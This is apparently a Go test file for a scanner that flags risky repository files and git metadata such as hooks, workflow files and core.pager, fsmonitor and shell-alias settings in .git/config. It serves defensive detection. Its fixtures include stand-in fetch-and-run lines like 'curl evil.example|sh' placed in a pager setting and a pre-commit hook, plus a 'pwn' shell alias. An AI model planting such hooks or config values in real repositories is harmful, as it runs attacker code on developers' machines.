package inventory

import (
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestIsReviewPath(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		path string
		want bool
	}{
		// Previously covered, must keep working.
		{name: "envrc", path: ".envrc", want: true},
		{name: "root makefile", path: "Makefile", want: true},
		{name: "root package.json", path: "package.json", want: true},
		{name: "vscode tasks", path: ".vscode/tasks.json", want: true},
		{name: "idea dir", path: ".idea/workspace.xml", want: true},
		{name: "claude dir", path: ".claude/settings.json", want: true},
		{name: "codex dir", path: ".codex/commands/run.md", want: true},

		// Previously missed.
		{name: "github workflow", path: ".github/workflows/ci.yml", want: true},
		{name: "nested github workflow", path: "sub/project/.github/workflows/ci.yml", want: true},
		{name: "pre-commit config", path: ".pre-commit-config.yaml", want: true},
		{name: "nested package.json", path: "packages/web/package.json", want: true},
		{name: "deeply nested package.json", path: "a/b/c/d/package.json", want: true},
		{name: "justfile", path: "justfile", want: true},
		{name: "nested justfile", path: "tools/justfile", want: true},
		{name: "taskfile", path: "Taskfile.yml", want: true},
		{name: "taskfile yaml", path: "Taskfile.yaml", want: true},
		{name: "mise toml", path: ".mise.toml", want: true},
		{name: "tool versions", path: ".tool-versions", want: true},
		{name: "build.rs", path: "crates/core/build.rs", want: true},
		{name: "pyproject", path: "pyproject.toml", want: true},
		{name: "code workspace", path: "saint.code-workspace", want: true},
		{name: "nested code workspace", path: "editors/saint.code-workspace", want: true},
		{name: "nested vscode", path: "packages/web/.vscode/tasks.json", want: true},
		{name: "husky hook", path: ".husky/pre-commit", want: true},
		{name: "git hook", path: ".git/hooks/pre-commit", want: true},
		{name: "lowercase makefile", path: "makefile", want: true},
		{name: "leading dot slash", path: "./Makefile", want: true},

		// Must stay quiet.
		{name: "source file", path: "internal/inventory/inventory.go", want: false},
		{name: "readme", path: "README.md", want: false},
		{name: "lockfile", path: "package-lock.json", want: false},
		{name: "package.json substring", path: "docs/about-package.json.md", want: false},
		{name: "not a workflow dir", path: "github/workflows/ci.yml", want: false},
		{name: "empty", path: "", want: false},
		{name: "similar prefix dir", path: ".githubx/workflows/ci.yml", want: false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if got := isReviewPath(tc.path); got != tc.want {
				t.Fatalf("isReviewPath(%q) = %v, want %v", tc.path, got, tc.want)
			}
		})
	}
}

func TestScanGitConfig(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		data string
		want []string
	}{
		{
			name: "default config is quiet",
			data: "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n",
		},
		{
			name: "core.pager",
			data: "[core]\n\tpager = sh -c 'curl evil.example|sh'\n",
			want: []string{".git/config:core.pager"},
		},
		{
			name: "core.fsmonitor",
			data: "[core]\n\tfsmonitor = /tmp/payload\n",
			want: []string{".git/config:core.fsmonitor"},
		},
		{
			name: "core.sshCommand is case insensitive",
			data: "[core]\n\tsshCommand = /tmp/payload\n",
			want: []string{".git/config:core.sshCommand"},
		},
		{
			name: "core.hooksPath",
			data: "[core]\n\thooksPath = ../../payload\n",
			want: []string{".git/config:core.hooksPath"},
		},
		{
			name: "core.editor",
			data: "[core]\n\teditor = /tmp/payload\n",
			want: []string{".git/config:core.editor"},
		},
		{
			name: "shell alias",
			data: "[alias]\n\tst = status\n\tpwn = !sh -c 'id'\n",
			want: []string{".git/config:alias.pwn"},
		},
		{
			name: "quoted shell alias",
			data: "[alias]\n\tpwn = \"!sh -c 'id'\"\n",
			want: []string{".git/config:alias.pwn"},
		},
		{
			name: "non-shell alias is fine",
			data: "[alias]\n\tst = status\n\tlg = log --oneline\n",
		},
		{
			name: "inline section header",
			data: "[core] pager = evil\n",
			want: []string{".git/config:core.pager"},
		},
		{
			name: "subsectioned core is still core",
			data: "[core \"weird\"]\n\tpager = evil\n",
			want: []string{".git/config:core.pager"},
		},
		{
			name: "same key in another section is ignored",
			data: "[pager]\n\tpager = evil\n[remote \"origin\"]\n\teditor = evil\n",
		},
		{
			name: "comments ignored",
			data: "# pager = evil\n; editor = evil\n[core]\n# hooksPath = evil\n",
		},
		{
			name: "multiple findings",
			data: "[core]\n\tpager = a\n\teditor = b\n[alias]\n\tx = !y\n",
			want: []string{".git/config:core.pager", ".git/config:core.editor", ".git/config:alias.x"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			got := scanGitConfig(tc.data)
			if len(got) != len(tc.want) {
				t.Fatalf("scanGitConfig() = %#v, want %#v", got, tc.want)
			}
			for i := range tc.want {
				if got[i] != tc.want[i] {
					t.Fatalf("scanGitConfig()[%d] = %q, want %q", i, got[i], tc.want[i])
				}
			}
		})
	}
}

func TestExcludeModified(t *testing.T) {
	t.Parallel()

	const gitDefault = "# git ls-files --others --exclude-from=.git/info/exclude\n" +
		"# Lines that start with '#' are comments.\n" +
		"# For a project mostly in C, the following would be a good set of\n"

	tests := []struct {
		name string
		data string
		want bool
	}{
		{name: "missing file", data: "", want: false},
		{name: "git default", data: gitDefault, want: false},
		{name: "default plus blank lines", data: gitDefault + "\n\n   \n", want: false},
		{name: "added rule", data: gitDefault + "payload.sh\n", want: true},
		{name: "rule only", data: "*.log\n", want: true},
		{name: "negation rule", data: gitDefault + "!keep-me\n", want: true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if got := excludeModified(tc.data); got != tc.want {
				t.Fatalf("excludeModified() = %v, want %v", got, tc.want)
			}
		})
	}
}

func TestScanHooksDir(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	write := func(name string, mode os.FileMode) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte("#!/bin/sh\n"), mode); err != nil {
			t.Fatalf("WriteFile(%q) error = %v", name, err)
		}
	}

	write("pre-commit", 0o755)
	write("post-checkout", 0o700)
	write("pre-push", 0o644)          // not executable: git will not run it
	write("pre-rebase.sample", 0o755) // shipped by git
	write("commit-msg.sample", 0o755) // shipped by git
	if err := os.Mkdir(filepath.Join(dir, "nested"), 0o755); err != nil {
		t.Fatalf("Mkdir() error = %v", err)
	}

	got := scanHooksDir(dir)
	slices.Sort(got)
	want := []string{".git/hooks/post-checkout", ".git/hooks/pre-commit"}
	if len(got) != len(want) {
		t.Fatalf("scanHooksDir() = %#v, want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("scanHooksDir()[%d] = %q, want %q", i, got[i], want[i])
		}
	}

	if paths := scanHooksDir(filepath.Join(dir, "does-not-exist")); paths != nil {
		t.Fatalf("scanHooksDir(missing) = %#v, want nil", paths)
	}
}

func TestGitMetadataReviewPathsOnRealRepo(t *testing.T) {
	t.Parallel()

	gitPath, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git is not installed")
	}

	repo := t.TempDir()
	if out, err := exec.Command(gitPath, "-C", repo, "init", "--quiet").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v: %s", err, out)
	}

	gitDir := filepath.Join(repo, ".git")
	hookPath := filepath.Join(gitDir, "hooks", "pre-commit")
	if err := os.MkdirAll(filepath.Dir(hookPath), 0o755); err != nil {
		t.Fatalf("MkdirAll() error = %v", err)
	}
	if err := os.WriteFile(hookPath, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	configPath := filepath.Join(gitDir, "config")
	existing, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatalf("ReadFile() error = %v", err)
	}
	appended := string(existing) + "[core]\n\tpager = /tmp/payload\n[alias]\n\tpwn = !/tmp/payload\n"
	if err := os.WriteFile(configPath, []byte(appended), 0o644); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	excludePath := filepath.Join(gitDir, "info", "exclude")
	if err := os.MkdirAll(filepath.Dir(excludePath), 0o755); err != nil {
		t.Fatalf("MkdirAll() error = %v", err)
	}
	if err := os.WriteFile(excludePath, []byte("# comment\npayload.sh\n"), 0o644); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	loc, err := findGitDir(repo)
	if err != nil {
		t.Fatalf("findGitDir() error = %v", err)
	}
	got := gitMetadataReviewPaths(loc.gitDir)

	for _, want := range []string{
		".git/hooks/pre-commit",
		".git/config:core.pager",
		".git/config:alias.pwn",
		".git/info/exclude",
	} {
		if !slices.Contains(got, want) {
			t.Fatalf("gitMetadataReviewPaths() = %#v, missing %q", got, want)
		}
	}
	for _, path := range got {
		if strings.HasSuffix(path, ".sample") {
			t.Fatalf("gitMetadataReviewPaths() flagged a shipped sample: %q", path)
		}
	}
}

func TestGitMetadataReviewPathsCleanRepoIsQuiet(t *testing.T) {
	t.Parallel()

	gitPath, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git is not installed")
	}

	repo := t.TempDir()
	if out, err := exec.Command(gitPath, "-C", repo, "init", "--quiet").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v: %s", err, out)
	}

	loc, err := findGitDir(repo)
	if err != nil {
		t.Fatalf("findGitDir() error = %v", err)
	}
	if got := gitMetadataReviewPaths(loc.gitDir); len(got) != 0 {
		t.Fatalf("gitMetadataReviewPaths() = %#v, want none for a fresh repo", got)
	}
}

// A directory that is not a repository resolves no git dir, and the metadata
// scan has nothing to look at.
func TestGitMetadataReviewPathsNonRepoIsQuiet(t *testing.T) {
	t.Parallel()

	if _, err := findGitDir(t.TempDir()); err == nil {
		t.Fatal("findGitDir() resolved a directory that is not a repository")
	}
	if got := gitMetadataReviewPaths(""); got != nil {
		t.Fatalf("gitMetadataReviewPaths() = %#v, want nil", got)
	}
}

func TestMergeReviewPathsDedupesAndSorts(t *testing.T) {
	t.Parallel()

	got := mergeReviewPaths(
		[]string{"Makefile", ".envrc"},
		[]string{".git/hooks/pre-commit", "Makefile"},
	)
	want := []string{".envrc", ".git/hooks/pre-commit", "Makefile"}
	if len(got) != len(want) {
		t.Fatalf("mergeReviewPaths() = %#v, want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("mergeReviewPaths()[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}
